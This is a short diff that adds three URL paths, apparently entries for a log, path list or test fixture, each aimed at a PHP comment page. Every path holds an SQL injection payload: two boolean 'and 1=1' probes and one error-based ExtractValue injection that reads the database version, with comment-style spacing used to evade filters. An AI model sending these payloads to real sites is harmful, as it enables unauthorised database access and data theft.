@@ -1,0 +1,3 @@
+/index.php?comment-822′/**/and/**/’1′=’1-ask-commentlist.html
+/485/index.php?comment-190′/**/and/**/’1′=’1-ask-commentlist.html
+/comment-8967′/**/and/**/ExtractValue(0×64,concat(0×01,(select/**/@@version)))/**/order/**/by/**/’1-ask-commentlist.html
